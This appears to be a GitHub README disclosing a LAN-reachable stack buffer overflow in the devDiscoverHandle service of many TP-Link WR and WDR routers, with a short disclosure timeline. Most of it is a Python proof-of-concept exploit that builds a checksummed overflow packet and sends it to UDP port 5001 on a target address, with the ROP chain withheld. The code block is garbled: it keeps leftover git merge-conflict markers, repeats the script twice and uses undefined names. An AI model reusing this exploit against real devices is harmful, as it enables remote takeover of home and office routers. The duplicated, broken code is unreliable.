# TP-Link-poc

TP-Link router have a stack overflow in devDiscoverHandle server.

Any user can get remote code execution through LAN, this vulnerability currently affects latest WR、WDR series, including WDR7400,WDR7500,WDR7660,WDR7800, WDR8400,WDR8500,WDR8600,WDR8620,WDR8640,WDR8660,WR880N,WR886N,WR890N,WR890N,WR882N,WR708N etc. It affects the linux system and vxworks system. we believe there are much more models suffered from this vuln.

## Vulnerability description

This vulnerability happen when  devDiscoverHandle  receive data by using `recvfrom` from `udp port 5001`.Then enter the `protocol_handler`->`parse_advertisement_frame`->`copy_msg_element`.In the function of `copy_msg_element` we can control `iParm1` and `iParm3` that It lead to a stack buffer overflow to execute arbitrary code.

![](./1.png)

## Poc

Refer to this video: [poc_video.mkv](./poc_video.mkv)

**poc**

```
<<<<<<< HEAD
import sys
import struct
import requests
from pwn import *
def fix_checksum(data):
    checksum = 0
    for off in range(0, len(data), 2):
        checksum += u16(data[off:off+2])
    checksum &= 0xffffffff
    while True:
        if (checksum >> 0x10) == 0:
            break
        checksum = (checksum & 0xffff) + (checksum >> 0x10)
    checksum &= 0xffff
    return p16(0xffff - checksum)

magic = '\x01\x02\x0e\x00\xe1\x2b\x83\xc7'
pad2 = '  ' + gadget.ljust(602-8-0x1d*0) + gadget1
tmp = '\x00\x05'+p16(len(pad2))+pad2
# gadget1 and gadget is ROPchain, here we don't show it.
checksum = fix_checksum(magic + p16(len(tmp)) + tmp)
payload = magic + checksum + p16(len(tmp)) + '\x00\x00' + tmp

udpsever=socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
udpsever.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
udpsever.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
udpsever.bind(('', MCAST_PORT))
mreq = struct.pack('4sl', socket.inet_aton(MCAST_GRP), socket.INADDR_ANY)
udpsever.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

udp=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
udp.sendto(payload,(sys.argv[1],5001))
=======
import sys
import struct
import requests
from pwn import *
def fix_checksum(data):
    checksum = 0
    for off in range(0, len(data), 2):
        checksum += u16(data[off:off+2])
    checksum &= 0xffffffff
    while True:
        if (checksum >> 0x10) == 0:
            break
        checksum = (checksum & 0xffff) + (checksum >> 0x10)
    checksum &= 0xffff
    return p16(0xffff - checksum)

magic = '\x01\x02\x0e\x00\xe1\x2b\x83\xc7'
pad2 = '  ' + gadget.ljust(602-8-0x1d*0) + gadget1
tmp = '\x00\x05'+p16(len(pad2))+pad2
# gadget1 and gadget is ROPchain, here we don't show it.
checksum = fix_checksum(magic + p16(len(tmp)) + tmp)
payload = magic + checksum + p16(len(tmp)) + '\x00\x00' + tmp

udpsever=socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
udpsever.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
udpsever.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
udpsever.bind(('', MCAST_PORT))
mreq = struct.pack('4sl', socket.inet_aton(MCAST_GRP), socket.INADDR_ANY)
udpsever.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

udp=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
udp.sendto(payload,(sys.argv[1],5001))
>>>>>>> 29ef439fb8d19ce806f84b1f7feb6ed6a51d74c8
udp.close()
```

## Timeline
2020.11.7 show in TFC conntest

2020.11.15 report to CVE and TP-Link
